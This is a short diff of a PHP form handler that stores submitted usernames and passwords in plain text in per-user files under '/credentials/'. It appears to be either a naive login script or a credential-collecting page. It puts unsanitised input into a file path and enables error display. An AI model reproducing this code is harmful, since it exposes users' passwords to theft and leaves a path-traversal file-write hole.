@@ -1,12 +1,15 @@
 <?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
 // Verifica se o formulário foi enviado
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
-    $username = isset($_POST['inp_unme']) ? $_POST['inp_unme'] : '';
-    $password = isset($_POST['inp_pwd']) ? $_POST['inp_pwd'] : '';
+    $username = isset($_POST['uname']) ? $_POST['uname'] : '';
+    $password = isset($_POST['pass']) ? $_POST['pass'] : '';
     
     $filePath = "/credentials/$username.txt";
-    $data = "Username: $username | Password: $password\n";
+    $data = "Username: $username | Password: $password";
     
     file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
     
